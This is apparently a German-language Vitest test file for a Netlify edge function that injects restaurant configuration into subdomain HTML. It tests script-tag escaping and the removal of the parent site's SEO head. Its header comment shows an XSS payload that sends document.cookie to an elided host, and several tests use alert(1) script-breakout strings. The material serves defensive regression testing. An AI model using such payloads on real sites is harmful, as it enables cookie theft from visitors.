// @vitest-environment node
/**
 * Die Konfiguration, die die Netlify-Edge-Function ins HTML schreibt
 * (netlify/edge-functions/inject-site-config.ts).
 *
 * ANLASS: Dort stand `JSON.stringify(config).replace(/<\/script>/gi, …)`. Das
 * greift zu kurz — der HTML-Parser beendet einen Script-Block auch bei
 * `</script ` und `</script/`. Ein Betriebsname wie
 *
 *   Adler</script ><script>fetch("https://…?c="+document.cookie)</script>
 *
 * hätte damit bei JEDEM Besucher der Subdomain fremdes JavaScript ausgeführt.
 * Der Name kommt aus dem HTML der analysierten Website (og:site_name), also
 * aus einer Quelle, die dem Betrieb nicht gehören muss.
 *
 * Die Escape-Funktion wird hier NICHT nachgebaut, sondern aus der echten Datei
 * gelesen und ausgeführt — ein Nachbau prüfte nur meine Annahme darüber.
 */
import { afterEach, describe, expect, it, vi } from "vitest";
import { readFileSync } from "node:fs";
import path from "node:path";

/** Die echte `fuerScriptBlock` aus der Edge-Function, ohne Deno-Importe. */
function ladeEscapeFunktion(): (wert: unknown) => string {
  const quelle = readFileSync(
    path.resolve(__dirname, "../../netlify/edge-functions/inject-site-config.ts"),
    "utf8",
  );
  const start = quelle.indexOf("function fuerScriptBlock");
  expect(start, "fuerScriptBlock nicht gefunden").toBeGreaterThan(-1);
  const ende = quelle.indexOf("\n}", start) + 2;
  // TypeScript-Annotationen entfernen - der Rumpf ist reines JavaScript.
  const code = quelle
    .slice(start, ende)
    .replace("function fuerScriptBlock(wert: unknown): string", "function fuerScriptBlock(wert)");
  // eslint-disable-next-line no-new-func
  return new Function(`${code}; return fuerScriptBlock;`)() as (w: unknown) => string;
}

const fuerScriptBlock = ladeEscapeFunktion();

/** Wie der Browser den Block beendet sieht: `</script` plus Trenner. */
const SCRIPT_ENDE = /<\/script[\s/>]/i;

describe("Escaping der injizierten Konfiguration", () => {
  it("lässt keine Schreibweise von </script durch", () => {
    for (const nutzlast of [
      "Adler</script><script>alert(1)</script>",
      "Adler</script ><script>alert(1)</script>",
      "Adler</script/><script>alert(1)</script>",
      "Adler</SCRIPT\t><script>alert(1)</script>",
    ]) {
      const ausgabe = fuerScriptBlock({ business: { name: nutzlast } });
      expect(ausgabe, nutzlast).not.toMatch(SCRIPT_ENDE);
      expect(ausgabe, nutzlast).not.toContain("<");
    }
  });

  it("escaped auch die Subdomain, die roh in einem JS-String stand", () => {
    const ausgabe = fuerScriptBlock('x";alert(1);//');
    expect(ausgabe).toBe('"x\\";alert(1);//"');
    // Und das Ergebnis ist ein einzelnes, gültiges Literal.
    expect(JSON.parse(ausgabe)).toBe('x";alert(1);//');
  });

  it("escaped die Zeilentrenner, die JavaScript aufbrechen würden", () => {
    const ausgabe = fuerScriptBlock({ t: "a b c" });
    expect(ausgabe).not.toContain(" ");
    expect(ausgabe).not.toContain(" ");
  });

  it("bleibt gültiges JSON mit unverändertem Inhalt", () => {
    const config = {
      business: { name: "Haus Töller & Söhne <GmbH>", type: "bar" },
      content: { menuItems: [{ name: "Halver Hahn", price: "4.90" }] },
    };
    const ausgabe = fuerScriptBlock(config);
    // Der Browser liest die Escapes zurück - der Inhalt kommt unverfälscht an.
    expect(JSON.parse(ausgabe)).toEqual(config);
  });
});

/**
 * ANLASS: Kunden-Subdomains bekommen dieselbe index.html wie www.maitr.de - und
 * die ist die vorgerenderte Maitr-Startseite. Live auf bella12.maitr.de stand
 * darin, auch nach dem Rendern: JSON-LD über Maitr (Builder für 39 €),
 * `<link rel="canonical" href="https://www.maitr.de/">`, og:url, Maitr-Titel und
 * die Startseite selbst im #root. Jede Restaurant-Seite meldete Google damit, sie
 * sei eine Dublette von maitr.de.
 *
 * Geprüft wird der echte Handler gegen die echte index.html: Ein Nachbau des
 * Markups bliebe grün, wenn jemand einen der Marker entfernt.
 */
type Handler = (
  req: Request,
  context: { next: () => Promise<Response> },
) => Promise<Response>;

const EDGE_FUNCTION = path.resolve(
  __dirname,
  "../../netlify/edge-functions/inject-site-config.ts",
);
const INDEX_HTML = readFileSync(path.resolve(__dirname, "../../index.html"), "utf8");
const BLOCK_START = '<script type="application/ld+json" id="maitr-jsonld">';
const ROOT_OPEN = '<div id="root">';
const ROOT_END = "<!-- Service Worker Registration -->";
const SPINNER_ROOT = `${ROOT_OPEN}\n    <div class="loading-spinner"></div>\n  </div>`;

/**
 * index.html nach `vite build`: Vite zieht das Einstiegs-Script aus dem <body>
 * als gebündeltes Modul in den <head>. Zwischen #root und dem Service-Worker-
 * Anker steht danach nur noch App-Markup - darauf verlassen sich prerender.mjs
 * und die Edge-Function. In der Quelle stünde dort noch das Script.
 */
const EINSTIEG = /[ \t]*<script type="module" src="\/client\/App\.tsx"><\/script>\n/;
const GEBAUT = INDEX_HTML.replace(EINSTIEG, "").replace(
  "</head>",
  '  <script type="module" crossorigin src="/assets/index-abc123.js"></script>\n</head>',
);

/**
 * index.html so, wie scripts/prerender.mjs die Startseite nach dist/spa schreibt:
 * Helmet-Kopf vor </head>, gerenderte Startseite plus Pfad-Wächter im #root.
 * Diese Fassung liefert Netlify auf den Subdomains tatsächlich aus.
 */
function wieVorgerendert(): string {
  const kopf =
    '<title data-rh="true">Maitr – Restaurant-Web-App</title>' +
    '<link data-rh="true" rel="canonical" href="https://www.maitr.de/"/>' +
    '<meta data-rh="true" property="og:url" content="https://www.maitr.de/"/>';
  const start = GEBAUT.indexOf(ROOT_OPEN);
  const ende = GEBAUT.indexOf(ROOT_END);
  return (
    GEBAUT.slice(0, start).replace("</head>", `  ${kopf}\n</head>`) +
    `${ROOT_OPEN}<main><section id="google-profil"><h2>Maitr – dein digitaler Gastgeber für Google</h2></section></main></div>\n` +
    `  <script>(function(){var p=location.pathname;})();</script>\n\n  ` +
    GEBAUT.slice(ende)
  );
}

const VORLAGEN: Array<[string, string]> = [
  ["gebaute index.html", GEBAUT],
  ["vorgerenderte Startseite", wieVorgerendert()],
];

/** Alles, woran man die Maitr-Startseite im ausgelieferten HTML erkennt. */
function erwarteKeinMaitr(html: string) {
  expect(html).not.toContain("maitr-jsonld");
  expect(html).not.toContain("application/ld+json");
  expect(html).not.toContain("https://www.maitr.de");
  expect(html).not.toContain('data-rh="true"');
  expect(html).not.toContain("Restaurant-Web-App");
  expect(html).not.toContain('id="google-profil"');
}

// Pfad als Variable: So folgt tsc dem Import nicht und muss die
// Netlify-Typen (@netlify/edge-functions, nicht installiert) nicht auflösen.
async function ladeHandler(): Promise<Handler> {
  return (await import(/* @vite-ignore */ EDGE_FUNCTION)).default as Handler;
}

function anfrage(host: string): Request {
  return { headers: new Headers({ host, accept: "text/html" }) } as unknown as Request;
}

function cdnAntwort(html: string) {
  return {
    next: vi.fn(
      async () =>
        new Response(html, {
          status: 200,
          headers: { "content-type": "text/html; charset=utf-8" },
        }),
    ),
  };
}

function railwayLiefert(data: Record<string, unknown>) {
  const fetchMock = vi.fn(
    async () =>
      new Response(JSON.stringify({ success: true, data }), {
        status: 200,
        headers: { "content-type": "application/json" },
      }),
  );
  vi.stubGlobal("fetch", fetchMock);
  return fetchMock;
}

describe("Maitr-Kopf auf Kunden-Subdomains", () => {
  afterEach(() => {
    vi.unstubAllGlobals();
    vi.restoreAllMocks();
  });

  it("index.html trägt alle Marker, an denen die Edge-Function schneidet", () => {
    expect(INDEX_HTML.split('id="maitr-jsonld"')).toHaveLength(2);
    expect(INDEX_HTML.split(ROOT_OPEN)).toHaveLength(2);
    expect(INDEX_HTML.split(ROOT_END)).toHaveLength(2);
    expect(INDEX_HTML.indexOf(ROOT_OPEN)).toBeLessThan(INDEX_HTML.indexOf(ROOT_END));
    expect(INDEX_HTML).toMatch(EINSTIEG);
    // Ohne diese Inhalte prüften die Tests unten nichts.
    expect(INDEX_HTML).toContain(
      '<link data-rh="true" rel="canonical" href="https://www.maitr.de/" />',
    );
    const block = INDEX_HTML.slice(
      INDEX_HTML.indexOf(BLOCK_START),
      INDEX_HTML.indexOf("</script>", INDEX_HTML.indexOf(BLOCK_START)),
    );
    expect(block).toContain('"name": "Maitr Web-App Builder"');
  });

  it.each(VORLAGEN)("%s: ersetzt den Maitr-Kopf durch den des Restaurants", async (_, vorlage) => {
    const fetchMock = railwayLiefert({
      businessName: "Trattoria Bella Vista",
      slogan: "Seit 1987",
      uniqueDescription: "Pasta & Wein",
    });
    const handler = await ladeHandler();

    const res = await handler(anfrage("trattoriabellavista.maitr.de"), cdnAntwort(vorlage));
    const html = await res.text();

    expect(fetchMock).toHaveBeenCalledTimes(1);
    expect(res.headers.get("x-maitr-edge")).toBe("injected");
    erwarteKeinMaitr(html);
    expect(html.match(/<title\b/g)).toHaveLength(1);
    expect(html).toContain("<title>Trattoria Bella Vista – Seit 1987</title>");
    expect(html).toContain('<meta name="description" content="Pasta &amp; Wein" />');
    expect(html).toContain('<meta property="og:site_name" content="Trattoria Bella Vista" />');
    expect(html).toContain('window.__MAITR_SUBDOMAIN__="trattoriabellavista"');
    // Die App selbst bleibt: Kopf-Ressourcen, leerer #root, alles ab dem Service Worker.
    expect(html).toContain('<link rel="manifest" href="/manifest.json" />');
    expect(html).toContain('<script type="module"');
    expect(html).toContain(SPINNER_ROOT);
    expect(html.endsWith(INDEX_HTML.slice(INDEX_HTML.indexOf(ROOT_END)))).toBe(true);
  });

  it("escaped Betriebsdaten im Kopf und übersteht $-Muster im Namen", async () => {
    railwayLiefert({ businessName: `Adler"><script>alert(1)</script> $' $&` });
    const handler = await ladeHandler();

    const res = await handler(anfrage("adler.maitr.de"), cdnAntwort(wieVorgerendert()));
    const html = await res.text();

    expect(html).toContain(
      "<title>Adler&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; $' $&amp;</title>",
    );
    expect(html).not.toContain("<script>alert(1)");
    // `$'` als Ersatz-Muster hätte den Rest des Dokuments ein zweites Mal eingefügt.
    expect(html.split(ROOT_OPEN)).toHaveLength(2);
    expect(html.split("</head>")).toHaveLength(2);
  });

  it("räumt auch auf, wenn die Config nicht geladen werden kann", async () => {
    vi.spyOn(console, "error").mockImplementation(() => {});
    vi.stubGlobal(
      "fetch",
      vi.fn(async () => {
        throw new Error("Railway nicht erreichbar");
      }),
    );
    const handler = await ladeHandler();

    const res = await handler(anfrage("trattoriabellavista.maitr.de"), cdnAntwort(wieVorgerendert()));
    const html = await res.text();

    expect(res.status).toBe(200);
    erwarteKeinMaitr(html);
    expect(html).not.toContain("<title");
    expect(html).toContain(SPINNER_ROOT);
  });

  it.each(["www.maitr.de", "maitr.de", "staging.maitr.de", "deploy-preview-6--maitr.netlify.app"])(
    "lässt die Seite auf %s unverändert",
    async (host) => {
      const fetchMock = vi.fn();
      vi.stubGlobal("fetch", fetchMock);
      const handler = await ladeHandler();
      const vorlage = wieVorgerendert();

      const res = await handler(anfrage(host), cdnAntwort(vorlage));

      expect(fetchMock).not.toHaveBeenCalled();
      expect(await res.text()).toBe(vorlage);
    },
  );
});
